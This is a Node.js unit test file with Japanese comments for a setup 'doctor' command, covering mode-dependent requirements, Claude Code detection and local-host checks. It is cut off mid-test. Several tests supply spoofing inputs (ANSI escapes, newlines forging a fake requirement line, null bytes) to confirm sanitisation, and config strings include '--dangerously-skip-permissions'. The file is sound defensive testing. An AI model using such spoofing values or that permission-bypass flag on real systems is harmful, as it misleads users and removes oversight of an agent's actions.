/**
 * doctor（初回セットアップ充足判定）のユニットテスト。
 * - モード別（queue.backend / terminals.mode）の required 切り替え
 * - owner → org.allowed_owners のプリフィル判定
 * - 全充足／一部欠損時の要約（summarizeDoctor）
 * - gh auth token の有無（フェイク execFileSync）
 * - マニフェスト有無（vk-agents 展開判定）
 *
 * 実 fs の一時ディレクトリ（mkdtempSync）＋ DI でテストする（tests/config.test.js の雛形）。
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { writeFileSync, mkdtempSync, rmSync, mkdirSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';
import { spawnSync } from 'child_process';
import { tmpdir } from 'os';
import {
  runDoctor,
  summarizeDoctor,
  formatDoctorReport,
  formatSetupEntryGuidance,
  formatDisplaySanitizedWarning,
  isLocalVkTerminalsApiHost,
} from '../src/doctor.js';

const BIN_PATH = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'vk-orchestrator.js');

// テスト環境を丸ごと注入するためのヘルパ。
// homeDir 配下に config（A）・canonical（C）・manifest を任意で用意し、
// gh 認証 / VK Terminals 導入 / tmux 導入 / Claude Code 導入 / platform / node を明示注入する。
function withDoctorEnv(
  {
    config = {},
    queueBackend,
    terminalsMode,
    allowedOwners,
    hasManifest = true,
    ghAuthenticated = true,
    vkTerminalsInstalled = true,
    tmuxInstalled = true,
    claudeInstalled = true,
    // VK Terminals API の接続先。既定は手元（127.0.0.1）＝ claude 要件は必須のまま。
    // 実 env（VK_TERMINALS_HOST）や実ファイル（~/.vk-terminals/config.json）でテストが
    // ぶれないよう、常に明示注入する（別マシン構成の検証はこの値を差し替えて行う）。
    vkTerminalsApiHost = '127.0.0.1',
    // 「手元のマシン」判定に使う自マシンのアドレス一覧。実マシンの NIC 構成でテストが
    // ぶれないよう既定を固定する（実運用では os.networkInterfaces() から集める）。
    localMachineAddresses = ['127.0.0.1'],
    // 「手元のマシン」判定に使う自マシンのホスト名。実マシンの os.hostname() でテストが
    // ぶれないよう既定を固定する（実運用では os.hostname() から集める）。
    localMachineHostnames = ['vko-test-machine'],
    platform = 'darwin',
    nodeVersion = '20.11.0',
  } = {},
  fn,
) {
  const dir = mkdtempSync(join(tmpdir(), 'vko-doctor-'));
  // resolveTerminalsMode は env VK_TERMINALS_MODE を config より優先するため、
  // 実行環境の env でテストがぶれないよう退避して外す（finally で復元）。
  const savedTerminalsModeEnv = process.env.VK_TERMINALS_MODE;
  delete process.env.VK_TERMINALS_MODE;
  // resolveTmuxClaudeCommand も env VK_TMUX_CLAUDE_CMD を config より優先するため同様に外す。
  const savedTmuxClaudeCmdEnv = process.env.VK_TMUX_CLAUDE_CMD;
  delete process.env.VK_TMUX_CLAUDE_CMD;
  try {
    const configPath = join(dir, 'config.json');
    writeFileSync(configPath, JSON.stringify(config));

    const canonicalConfigPath = join(dir, '.vk-agents', 'config.json');
    if (allowedOwners !== undefined) {
      mkdirSync(dirname(canonicalConfigPath), { recursive: true });
      writeFileSync(canonicalConfigPath, JSON.stringify({ org: { allowed_owners: allowedOwners } }));
    }

    const manifestPath = join(dir, '.claude', 'skills', '.agent-skills-manifest');
    if (hasManifest) {
      mkdirSync(dirname(manifestPath), { recursive: true });
      writeFileSync(manifestPath, 'vk-kore\n');
    }

    const options = {
      homeDir: dir,
      configPath,
      queueBackend,
      terminalsMode,
      manifestPath,
      canonicalConfigPath,
      vkTerminalsApiHost,
      localMachineAddresses,
      localMachineHostnames,
      platform,
      nodeVersion,
      execFileSync: () => {
        if (!ghAuthenticated) throw new Error('gh not authenticated');
        return 'gho_faketoken\n';
      },
      resolveVkTerminalsDir: () => {
        if (!vkTerminalsInstalled) throw new Error('vk-terminals not installed');
        return join(dir, 'node_modules', 'vk-terminals');
      },
      // gh 認証用の execFileSync とは別フック（引数を見ないフェイクで「常に導入済み」に倒れないように）。
      resolveTmuxVersion: () => {
        if (!tmuxInstalled) throw new Error('tmux not found');
        return 'tmux 3.4';
      },
      // claude も tmux と同じく専用フックにする。実 PATH の claude を見に行くと
      // 「開発マシンには入っているのでテストが通る」状態になり、未導入環境の検知を検証できない。
      resolveClaudeVersion: () => {
        if (!claudeInstalled) throw new Error('claude not found');
        return '2.0.14 (Claude Code)';
      },
    };
    return fn(options);
  } finally {
    if (savedTerminalsModeEnv === undefined) delete process.env.VK_TERMINALS_MODE;
    else process.env.VK_TERMINALS_MODE = savedTerminalsModeEnv;
    if (savedTmuxClaudeCmdEnv === undefined) delete process.env.VK_TMUX_CLAUDE_CMD;
    else process.env.VK_TMUX_CLAUDE_CMD = savedTmuxClaudeCmdEnv;
    rmSync(dir, { recursive: true, force: true });
  }
}

function byId(requirements, id) {
  const r = requirements.find((x) => x.id === id);
  assert.ok(r, `要件 ${id} が存在すること`);
  return r;
}

test('runDoctor: ローカルモードでは gh 認証・github.owner・repo・assigneeFilter は任意になる', () => {
  withDoctorEnv({ queueBackend: 'local', ghAuthenticated: false, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'gh-auth').required, false);
    assert.equal(byId(reqs, 'github.owner').required, false);
    assert.equal(byId(reqs, 'github.repo').required, false);
    assert.equal(byId(reqs, 'orchestrator.assigneeFilter').required, false);
    // 前提とモード・allowed_owners は両モードで必須。
    assert.equal(byId(reqs, 'node').required, true);
    assert.equal(byId(reqs, 'platform').required, true);
    assert.equal(byId(reqs, 'vk-terminals').required, true);
    assert.equal(byId(reqs, 'vk-agents-setup').required, true);
    assert.equal(byId(reqs, 'queue.backend').required, true);
    assert.equal(byId(reqs, 'org.allowed_owners').required, true);
  });
});

test('runDoctor: GitHub モードでは gh 認証・owner・repo・assigneeFilter・allowed_owners が必須になる', () => {
  withDoctorEnv({ queueBackend: 'github', allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'gh-auth').required, true);
    assert.equal(byId(reqs, 'github.owner').required, true);
    assert.equal(byId(reqs, 'github.repo').required, true);
    assert.equal(byId(reqs, 'orchestrator.assigneeFilter').required, true);
    assert.equal(byId(reqs, 'org.allowed_owners').required, true);
  });
});

test('runDoctor: queue.backend を options ではなく config から解決する', () => {
  withDoctorEnv({ config: { queue: { backend: 'github' } }, allowedOwners: ['vektor-inc'] }, (options) => {
    // queueBackend を明示注入しない（config から読む）。
    delete options.queueBackend;
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'queue.backend').current, 'GitHub');
    assert.equal(byId(reqs, 'gh-auth').required, true);
  });
});

test('runDoctor: gh 未認証は gh-auth を ok=false にする（GitHub モード）', () => {
  withDoctorEnv({ queueBackend: 'github', ghAuthenticated: false, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    const gh = byId(reqs, 'gh-auth');
    assert.equal(gh.ok, false);
    assert.equal(gh.required, true);
  });
});

test('runDoctor: gh 認証済みは gh-auth を ok=true にする', () => {
  withDoctorEnv({ queueBackend: 'github', ghAuthenticated: true, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'gh-auth').ok, true);
  });
});

test('runDoctor: マニフェスト有無で vk-agents-setup の ok が変わる', () => {
  withDoctorEnv({ hasManifest: false, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'vk-agents-setup').ok, false);
  });
  withDoctorEnv({ hasManifest: true, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'vk-agents-setup').ok, true);
  });
});

test('runDoctor: VK Terminals 未導入は vk-terminals を ok=false にする', () => {
  withDoctorEnv({ vkTerminalsInstalled: false, allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'vk-terminals').ok, false);
  });
});

test('runDoctor: vk-terminals モード（既定）では VK Terminals 必須・tmux 要件は出ない', () => {
  withDoctorEnv({ terminalsMode: 'vk-terminals', allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'vk-terminals').required, true);
    assert.equal(
      reqs.find((r) => r.id === 'tmux'),
      undefined,
      'vk-terminals モードでは tmux 要件の行を出さないこと',
    );
    // プラットフォームは GUI 前提の文言のまま。
    assert.match(byId(reqs, 'platform').label, /WSL2/);
    assert.equal(byId(reqs, 'terminals.mode').current, 'vk-terminals（既定）');
    assert.equal(byId(reqs, 'terminals.mode').ok, true);
    assert.equal(byId(reqs, 'terminals.mode').required, true);
  });
});

test('runDoctor: tmux モードでは VK Terminals は任意・tmux 要件が必須になる', () => {
  withDoctorEnv({ terminalsMode: 'tmux', allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    assert.equal(byId(reqs, 'vk-terminals').required, false);
    assert.match(byId(reqs, 'vk-terminals').hint, /tmux モードでは VK Terminals/);
    const tmux = byId(reqs, 'tmux');
    assert.equal(tmux.required, true);
    assert.equal(tmux.ok, true);
    assert.equal(tmux.current, 'tmux 3.4');
    assert.match(tmux.hint, /brew install tmux/);
    // プラットフォームは GUI 非依存の文言に差し替わる。
    const platformReq = byId(reqs, 'platform');
    assert.match(platformReq.label, /macOS \/ Linux/);
    assert.match(platformReq.hint, /GUI を起動しない/);
    assert.equal(byId(reqs, 'terminals.mode').current, 'tmux');
    // group が飛び地にならない（formatDoctorReport の見出しが重複しない）こと。
    const groups = reqs.map((r) => r.group);
    const uniqueRuns = groups.filter((g, i) => g !== groups[i - 1]);
    assert.equal(uniqueRuns.length, new Set(groups).size, 'same group must be contiguous');
  });
});

test('runDoctor: tmux モードで tmux 未導入は必須欠損になる', () => {
  withDoctorEnv({ terminalsMode: 'tmux', tmuxInstalled: false, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    const tmux = byId(reqs, 'tmux');
    assert.equal(tmux.ok, false);
    assert.equal(tmux.current, '未導入');
    const summary = summarizeDoctor(reqs);
    assert.equal(summary.allRequiredOk, false);
    assert.ok(summary.missingRequired.map((r) => r.id).includes('tmux'));
  });
});

test('runDoctor: tmux モードは VK Terminals 未導入でも allRequiredOk=true（本 issue の回帰テスト）', () => {
  withDoctorEnv(
    { terminalsMode: 'tmux', queueBackend: 'local', vkTerminalsInstalled: false, allowedOwners: ['vektor-inc'] },
    (options) => {
      const reqs = runDoctor(options);
      const vkTerminals = byId(reqs, 'vk-terminals');
      assert.equal(vkTerminals.ok, false);
      assert.equal(vkTerminals.required, false);
      const summary = summarizeDoctor(reqs);
      assert.equal(summary.allRequiredOk, true, `missing: ${summary.missingRequired.map((r) => r.id).join(',')}`);
    },
  );
});

test('runDoctor: vk-terminals モードは VK Terminals 未導入なら allRequiredOk=false（緩みの回帰防止）', () => {
  withDoctorEnv(
    { terminalsMode: 'vk-terminals', queueBackend: 'local', vkTerminalsInstalled: false, allowedOwners: ['vektor-inc'] },
    (options) => {
      const summary = summarizeDoctor(runDoctor(options));
      assert.equal(summary.allRequiredOk, false);
      assert.ok(summary.missingRequired.map((r) => r.id).includes('vk-terminals'));
    },
  );
});

test('runDoctor: tmux -V の出力は先頭行・制御文字除去・長さ制限してから current に入れる', () => {
  withDoctorEnv({ terminalsMode: 'tmux', allowedOwners: ['vektor-inc'] }, (options) => {
    // 改行で偽の ✅ 行を混ぜ込む／ANSI エスケープ／長すぎる出力を注入する。
    options.resolveTmuxVersion = () =>
      `\u001b[32mtmux 3.4\u0007\u001b[0m\n  ✅ 偽の要件行（必須） … なりすまし\n${'x'.repeat(500)}`;
    const tmux = byId(runDoctor(options), 'tmux');
    assert.equal(tmux.current, 'tmux 3.4');
    assert.equal(tmux.ok, true);
    // レポートに偽の行が混ざらないこと。
    const report = formatDoctorReport(runDoctor(options));
    assert.doesNotMatch(report, /偽の要件行/);
  });
});

test('runDoctor: claude 未導入は必須欠損として案内される（issue #247）', () => {
  // 初回 `npm start` で Claude Code が未導入の環境。以前はこの要件自体が無く、
  // doctor も up も何も案内しないままペインで claude が起動できずに詰んでいた。
  withDoctorEnv({ queueBackend: 'local', claudeInstalled: false, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    const claude = byId(reqs, 'claude');
    assert.equal(claude.required, true);
    assert.equal(claude.ok, false);
    assert.equal(claude.group, '前提');
    assert.equal(claude.target, 'external');
    assert.match(claude.current, /未導入/);
    // インストール手順が hint に載っていること（自動インストールはしない方針）。
    assert.match(claude.hint, /@anthropic-ai\/claude-code/);

    const summary = summarizeDoctor(reqs);
    assert.equal(summary.allRequiredOk, false);
    assert.ok(summary.missingRequired.map((r) => r.id).includes('claude'));

    // up / doctor の案内文（missingRequired の label + hint）に出ること。
    const report = formatDoctorReport(reqs);
    assert.match(report, /Claude Code/);
    assert.match(report, /@anthropic-ai\/claude-code/);
  });
});

test('runDoctor: claude 導入済みは ok=true・current にバージョンを出す', () => {
  withDoctorEnv({ queueBackend: 'local', claudeInstalled: true, allowedOwners: ['vektor-inc'] }, (options) => {
    const reqs = runDoctor(options);
    const claude = byId(reqs, 'claude');
    assert.equal(claude.ok, true);
    assert.equal(claude.current, '2.0.14 (Claude Code)');
    assert.equal(summarizeDoctor(reqs).allRequiredOk, true);
  });
});

test('runDoctor: vk-terminals モードでは素の claude を検査対象にする', () => {
  // vk-terminals モードのペイン起動は VK Terminals 側が素の claude を叩くため、
  // tmux.claudeCommand の指定があっても検査対象は 'claude' のまま。
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      config: { tmux: { claudeCommand: 'my-claude --dangerously-skip-permissions' } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const checked = [];
      options.resolveClaudeVersion = (command) => {
        checked.push(command);
        return '2.0.14 (Claude Code)';
      };
      assert.equal(byId(runDoctor(options), 'claude').ok, true);
      assert.deepEqual(checked, ['claude']);
    },
  );
});

test('runDoctor: tmux モードは tmux.claudeCommand の先頭トークンを検査対象にする', () => {
  // 独自コマンド運用（bypass 用の引数付きなど）で「素の claude が無い」と誤検知しないこと。
  // 設定値は任意文字列なので、シェルへ渡さず実行ファイル名（先頭トークン）だけを検査する。
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      config: { tmux: { claudeCommand: 'my-claude --dangerously-skip-permissions' } },
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const checked = [];
      options.resolveClaudeVersion = (command) => {
        checked.push(command);
        return '2.0.14 (Claude Code)';
      };
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.ok, true);
      assert.deepEqual(checked, ['my-claude'], '引数を落とした実行ファイル名だけを検査すること');
      // 独自コマンド利用者が原因に気づけるよう、hint に設定キーと現在値を出す。
      assert.match(claude.hint, /tmux\.claudeCommand/);
      assert.match(claude.hint, /my-claude/);
      // 成功時も検査対象を出す（自分の設定が見られているか確認できるようにする）。
      assert.match(claude.current, /コマンド: my-claude/);
    },
  );
});

test('runDoctor: 64 文字を超える絶対パスを切り詰めずに検査対象へ渡す', () => {
  // 表示用サニタイズ（64 文字で切り詰め）を実行対象に流用すると、fnm / volta 配下の
  // claude の絶対パスが途中で切れて別の実体を指す。「tmux サーバーの PATH に claude が
  // 無いから絶対パスを書く」は典型的な設定動機なので、正しく設定できている人ほど
  // 誤検知される。実行に渡す値は切り詰めないこと。
  const longPath = '/Users/someuser/.local/share/fnm/node-versions/v20.11.0/installation/bin/claude';
  assert.ok(longPath.length > 64, '前提: 検証には 64 文字超のパスを使う');
  withDoctorEnv(
    { terminalsMode: 'tmux', config: { tmux: { claudeCommand: `${longPath} --dangerously-skip-permissions` } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const checked = [];
      options.resolveClaudeVersion = (command) => {
        checked.push(command);
        return '2.0.14 (Claude Code)';
      };
      assert.equal(byId(runDoctor(options), 'claude').ok, true);
      assert.deepEqual(checked, [longPath]);
    },
  );
});

test('runDoctor: 長い検査対象コマンドは実行には全長を渡し、レポートには有界な値だけ出す', () => {
  // 実行側（切り詰めない）と表示側（切り詰める）の両方向を 1 本でロックする。
  // 表示を生の値に戻しても、実行を切り詰めた値に戻しても、どちらでも落ちること。
  const longPath = `/opt/${'a'.repeat(200)}/claude`;
  withDoctorEnv(
    { terminalsMode: 'tmux', config: { tmux: { claudeCommand: longPath } }, allowedOwners: ['vektor-inc'] },
    (options) => {
      const checked = [];
      options.resolveClaudeVersion = (command) => {
        checked.push(command);
        throw new Error('claude not found');
      };
      const claude = byId(runDoctor(options), 'claude');
      // 実行対象は全長のまま（途中で切れたパスは別の実体を指す）。
      assert.deepEqual(checked, [longPath]);
      // 表示は有界。レポート 1 行が設定値の長さで無制限に伸びないこと。
      assert.ok(!claude.current.includes(longPath), 'current に全長を出さないこと');
      assert.ok(
        claude.current.length <= 100,
        `current が有界であること（実際: ${claude.current.length} 文字）`,
      );
    },
  );
});

test('runDoctor: tmux モードで独自 claude コマンドが未導入なら ok=false・current に対象名を出す', () => {
  withDoctorEnv(
    { terminalsMode: 'tmux', config: { tmux: { claudeCommand: 'my-claude' } }, claudeInstalled: false, allowedOwners: ['vektor-inc'] },
    (options) => {
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.ok, false);
      assert.equal(claude.current, '未導入（コマンド: my-claude）');
      // 独自コマンドが見つからないときに「npm install …」を先頭に置くと、それを実行しても
      // 生えるのは claude で設定した独自コマンドは直らない。一番効く行動を先に出すこと。
      assert.match(claude.hint, /^ペイン起動に使うコマンド "my-claude" が見つかりません。/);
    },
  );
});

test('runDoctor: 既定コマンドのときは hint に tmux.claudeCommand の説明を出さない', () => {
  // 独自コマンドを使っていない大多数に設定キーの説明を出すのは冗長なので、
  // 検査対象が既定 claude かどうかで hint 自体を分ける。
  for (const terminalsMode of ['vk-terminals', 'tmux']) {
    withDoctorEnv({ terminalsMode, claudeInstalled: false, allowedOwners: ['vektor-inc'] }, (options) => {
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.current, '未導入（コマンド: claude）');
      // 独自コマンド分岐と同じ「何が見つからないか → 打つ手」の型で始めること。
      assert.match(claude.hint, /^`claude` コマンドが見つかりません。/);
      assert.doesNotMatch(claude.hint, /tmux\.claudeCommand/);
      // 「入れたのに見つからない（PATH 未反映）」は最頻の詰まりどころなので両モードで案内する。
      assert.match(claude.hint, /claude --version/);
      assert.match(claude.hint, /シェルを開き直して/);
    });
  }
});

test('runDoctor: claude 導入済み・既定コマンドなら current にコマンド名を添えない', () => {
  withDoctorEnv({ terminalsMode: 'tmux', allowedOwners: ['vektor-inc'] }, (options) => {
    assert.equal(byId(runDoctor(options), 'claude').current, '2.0.14 (Claude Code)');
  });
});

// --- VK Terminals API の接続先が別マシンのときの claude 要件（issue #249）---

test('isLocalVkTerminalsApiHost: ループバック・全アドレス束縛・判定不能な値は手元へ倒す', () => {
  const localAddresses = ['127.0.0.1', '100.64.0.2'];
  // 自マシン名も明示注入する。既定（os.hostname()）のままだと、実行マシンの名前が
  // `mac-mini` だったときに下の「別マシン扱い」の期待が実機依存で揺れるため。
  const localHostnames = ['vko-test-machine'];
  const localHosts = [
    '127.0.0.1', 'localhost', 'LOCALHOST', '::1', '[::1]', // ループバック
    '127.0.1.1', '::ffff:127.0.0.1', // 127.0.0.0/8 と IPv4 射影ループバック
    '0.0.0.0', '::', // 全アドレス束縛（どの NIC で受けても手元のプロセス）
    '', '  ', undefined, null, // 未設定・解決失敗
    '127.0.0.1\u0000', '192.0.2.10\n  ✅ 偽の要件行', // ホストとして妥当でない＝判定不能
    '100.64.0.2', // 自マシンのアドレス（Tailscale IP をそのまま書く運用）
  ];
  for (const host of localHosts) {
    assert.equal(
      isLocalVkTerminalsApiHost(host, localAddresses, localHostnames),
      true,
      `${String(host)} は手元扱い`,
    );
  }
  for (const host of ['100.64.0.3', '192.0.2.10', 'mac-mini.local', 'example.tailnet.ts.net']) {
    assert.equal(
      isLocalVkTerminalsApiHost(host, localAddresses, localHostnames),
      false,
      `${host} は別マシン扱い`,
    );
  }
});

test('runDoctor: apiHost が自マシンのアドレスなら claude は必須のまま（fail-open 回避）', () => {
  // tailscale serve 経由でモバイルから確認する運用では、apiHost に自分の Tailscale IP や
  // LAN IP を書く。ペインは手元で開くので claude は手元に必要。ループバック表記だけを
  // 見て「別マシン」と判定すると、#247 が救おうとした「claude が無くてタスクが進まない
  // のに何も案内されない」状態がそのまま再発する。engine 側（resolveTaskPaneCwd）と
  // 同じ isLocalMachineHost() を使い、判定を 1 か所に寄せること。
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.2',
      localMachineAddresses: ['127.0.0.1', '100.64.0.2'],
      claudeInstalled: false,
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      const claude = byId(reqs, 'claude');
      assert.equal(claude.required, true);
      assert.equal(claude.current, '未導入（コマンド: claude）');
      assert.ok(summarizeDoctor(reqs).missingRequired.map((r) => r.id).includes('claude'));
    },
  );
});

test('runDoctor: 全アドレス束縛・127.0.0.0/8・判定不能な apiHost は必須のまま（安全側）', () => {
  // 「手元かどうか判断できない」ときに任意へ倒すと案内が消えて詰みが再発するので、
  // 迷ったら従来どおり必須にする。
  for (const host of ['0.0.0.0', '::', '127.0.1.1', '::ffff:127.0.0.1', '127.0.0.1\u0000']) {
    withDoctorEnv(
      {
        terminalsMode: 'vk-terminals',
        vkTerminalsApiHost: host,
        claudeInstalled: false,
        queueBackend: 'local',
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        assert.equal(
          byId(runDoctor(options), 'claude').required,
          true,
          `${JSON.stringify(host)} は手元扱いで必須のままにすること`,
        );
      },
    );
  }
});

// --- apiHost に自マシンの「ホスト名」を書いた構成（issue #256-1）---

test('isLocalVkTerminalsApiHost: 自マシンのホスト名（.local / MagicDNS 名）は手元へ倒す', () => {
  // 判定は engine と共通の isLocalMachineHost() に委ねる。doctor 側だけへ
  // ホスト名照合を足すと、#255 で 1 か所へ寄せた判定がまた枝分かれする。
  const localAddresses = ['127.0.0.1', '100.64.0.2'];
  const localHostnames = ['mymac.local'];
  for (const host of ['mymac.local', 'mymac', 'mymac.tail1234.ts.net', 'MyMac.Local']) {
    assert.equal(
      isLocalVkTerminalsApiHost(host, localAddresses, localHostnames),
      true,
      `${host} は手元扱い`,
    );
  }
  for (const host of ['other.local', 'other.tail1234.ts.net']) {
    assert.equal(
      isLocalVkTerminalsApiHost(host, localAddresses, localHostnames),
      false,
      `${host} は別マシン扱い`,
    );
  }
});

test('runDoctor: apiHost が自マシンのホスト名なら claude は必須のまま（issue #256-1）', () => {
  // ペインは手元で開くのに「別マシンだから claude は任意」と診断されると、
  // Claude Code 未導入で作業が進まない状態を検知できなくなる（#247 への逆戻り）。
  for (const host of ['mymac.local', 'mymac.tail1234.ts.net']) {
    withDoctorEnv(
      {
        terminalsMode: 'vk-terminals',
        vkTerminalsApiHost: host,
        localMachineAddresses: ['127.0.0.1'],
        localMachineHostnames: ['mymac.local'],
        claudeInstalled: false,
        queueBackend: 'local',
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const reqs = runDoctor(options);
        const claude = byId(reqs, 'claude');
        assert.equal(claude.required, true, `${host} は手元扱いで必須のままにすること`);
        assert.equal(claude.current, '未導入（コマンド: claude）');
        assert.ok(summarizeDoctor(reqs).missingRequired.map((r) => r.id).includes('claude'));
      },
    );
  }
});

test('runDoctor: vk-terminals モード＋別マシン接続なら claude は任意（⚠️）になる（issue #249）', () => {
  // ペインは接続先マシンで開くため、手元に claude が無くてもタスクは進む。
  // 従来はここが常に必須で、解消しようのない ❌ が出続けていた。
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.2',
      claudeInstalled: false,
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      const claude = byId(reqs, 'claude');
      assert.equal(claude.required, false);
      assert.equal(claude.ok, false);
      // レポート本体には label と current しか出ないので、current だけで理由が分かること。
      assert.match(claude.current, /接続先/);
      assert.match(claude.current, /100\.64\.0\.2/);
      // hint は「接続先マシンに入っていれば足りる」ことを伝えること。
      assert.match(claude.hint, /接続先/);
      assert.match(claude.hint, /100\.64\.0\.2/);

      const summary = summarizeDoctor(reqs);
      assert.ok(!summary.missingRequired.map((r) => r.id).includes('claude'));
      assert.equal(summary.allRequiredOk, true);

      // レポートでも ⚠️（任意）として出て、未充足の必須項目としては数えないこと。
      const report = formatDoctorReport(reqs);
      assert.match(report, /⚠️ Claude Code コマンド導入（任意）/);
      assert.doesNotMatch(report, /まず Claude Code をインストールしてください/);
    },
  );
});

test('runDoctor: vk-terminals モードでも接続先が手元なら claude は従来どおり必須', () => {
  for (const host of ['127.0.0.1', 'localhost', '::1']) {
    withDoctorEnv(
      {
        terminalsMode: 'vk-terminals',
        vkTerminalsApiHost: host,
        claudeInstalled: false,
        queueBackend: 'local',
        allowedOwners: ['vektor-inc'],
      },
      (options) => {
        const reqs = runDoctor(options);
        const claude = byId(reqs, 'claude');
        assert.equal(claude.required, true, `${host} は手元扱いで必須のままにすること`);
        assert.equal(claude.current, '未導入（コマンド: claude）');
        assert.ok(summarizeDoctor(reqs).missingRequired.map((r) => r.id).includes('claude'));
      },
    );
  }
});

test('runDoctor: tmux モードは接続先が別マシンでも claude は必須のまま', () => {
  // tmux モードのペインは手元のマシンで開くので、VK Terminals API の接続先は無関係。
  withDoctorEnv(
    {
      terminalsMode: 'tmux',
      vkTerminalsApiHost: '100.64.0.2',
      claudeInstalled: false,
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const reqs = runDoctor(options);
      const claude = byId(reqs, 'claude');
      assert.equal(claude.required, true);
      assert.equal(claude.ok, false);
      assert.match(claude.hint, /^`claude` コマンドが見つかりません。/);
      assert.ok(summarizeDoctor(reqs).missingRequired.map((r) => r.id).includes('claude'));
    },
  );
});

test('runDoctor: 別マシン接続でも claude が見つかれば従来どおり ✅（余計な注記を足さない）', () => {
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.2',
      claudeInstalled: true,
      queueBackend: 'local',
      allowedOwners: ['vektor-inc'],
    },
    (options) => {
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.ok, true);
      assert.equal(claude.current, '2.0.14 (Claude Code)');
    },
  );
});

test('runDoctor: 接続先ホストは resolveVkTerminalsApiHost から解決する', () => {
  withDoctorEnv(
    { terminalsMode: 'vk-terminals', claudeInstalled: false, queueBackend: 'local', allowedOwners: ['vektor-inc'] },
    (options) => {
      // 値の直接注入ではなく、解決関数の差し替えでも効くこと（実運用の経路）。
      delete options.vkTerminalsApiHost;
      options.resolveVkTerminalsApiHost = () => '192.0.2.10';
      const claude = byId(runDoctor(options), 'claude');
      assert.equal(claude.required, false);
      assert.match(claude.current, /192\.0\.2\.10/);
    },
  );
});

test('runDoctor: 接続先ホストの解決が例外でも落ちず、従来どおり必須へ倒す（安全側）', () => {
  withDoctorEnv(
    { terminalsMode: 'vk-terminals', claudeInstalled: false, queueBackend: 'local', allowedOwners: ['vektor-inc'] },
    (options) => {
      delete options.vkTerminalsApiHost;
      options.resolveVkTerminalsApiHost = () => {
        throw new Error('~/.vk-terminals/config.json is broken');
      };
      let reqs;
      assert.doesNotThrow(() => {
        reqs = runDoctor(options);
      });
      assert.equal(byId(reqs, 'claude').required, true);
    },
  );
});

test('runDoctor: 接続先ホストが制御文字入りなら必須のまま・レポート行も壊さない', () => {
  // ホストとして妥当でない値は「手元かどうか判断できない」ので必須へ倒す（安全側）。
  // そのうえで、値が current / hint に出ても偽の要件行を混ぜ込めないこと。
  withDoctorEnv(
    { terminalsMode: 'vk-terminals', claudeInstalled: false, queueBackend: 'local', allowedOwners: ['vektor-inc'] },
    (options) => {
      options.vkTerminalsApiHost = '100.64.0.2\n  ✅ 偽の要件行（必須） … なりすまし';
      const reqs = runDoctor(options);
      assert.equal(byId(reqs, 'claude').required, true);
      assert.doesNotMatch(formatDoctorReport(reqs), /偽の要件行/);
    },
  );
});

test('formatDoctorReport: 別マシン構成で claude が無いとき、締めが「手元で開いて実行」と矛盾しない', () => {
  // 「ペインは接続先で開く（手元は任意）」と表示した数行後に「手元の Claude Code で開いて
  // /vk-orchestrator-setup を実行」と締めると読み手が矛盾で止まる。claude が任意へ落ちると
  // missingRequired から消えるため、締めの判定は missingRequired ではなく claude の ok を見る。
  withDoctorEnv(
    {
      terminalsMode: 'vk-terminals',
      vkTerminalsApiHost: '100.64.0.2',
      claudeInstalled: false,
      // 他に未充足の必須項目を作る（allowed_owners 未設定）。
      queueBackend: 'local',
    },
    (options) => {
      const reqs = runDoctor(options);
      const summary = summarizeDoctor(reqs);
      assert.equal(byId(reqs, 'claude').required, false);
      assert.ok(!summary.allRequiredOk, '前提: 他に未充足の必須項目があること');

      const report = formatDoctorReport(reqs);
      // 従来の締め（手元で開いて実行）をそのまま出さないこと。
      assert.doesNotMatch(report, /Claude Code でこのリポジトリを開き/);
      assert.doesNotMatch(report, /まず Claude Code をインストールしてください/);
      // 対話セットアップだけは手元で走ることと、入れない場合の逃げ道を示すこと。
      assert.match(report, /`\/vk-orchestrator-setup` は手元の Claude Code で実行します/);
      assert.match(report, /config\.json に直接記入/);
    },
  );
});

test('formatSetupEntryGuidance: requirements 省略時は従来動作（後方互換）', () => {
  withDoctorEnv(
    { terminalsMode: 'vk-terminals', vkTerminalsApiHost: '100.64.0.2', claudeInstalled: false, queueBackend: 'local' },
    (options) => {
      const summary = summarizeDoctor(runDoctor(options));
      // 第2引数なし＝ missingRequired だけを見るので、任意の claude は判定に入らない。
      assert.match(
        formatSetupEntryGuidance(summary),
